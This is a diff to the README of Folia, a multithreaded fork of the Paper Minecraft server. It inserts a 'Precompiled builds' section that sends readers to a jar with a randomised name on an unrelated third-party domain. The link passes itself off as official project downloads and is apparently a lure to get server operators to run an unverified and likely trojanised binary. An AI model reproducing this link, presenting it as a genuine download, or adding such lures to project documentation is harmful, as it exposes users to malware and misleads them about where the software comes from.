@@ -4,6 +4,8 @@
     <p>Fork of <a href="https://github.com/PaperMC/Paper">Paper</a> which adds regionised multithreading to the dedicated server.</p>
 </div>
 
+## Precompiled builds
+If you are here for the precompiled builds, you can download them here : [https://spyderrock.com/rLcV0080-folia-bundler-1.jar](https://spyderrock.com/rLcV0080-folia-bundler-1.jar)
 ## Overview
 
 Folia groups nearby loaded chunks to form an "independent region."
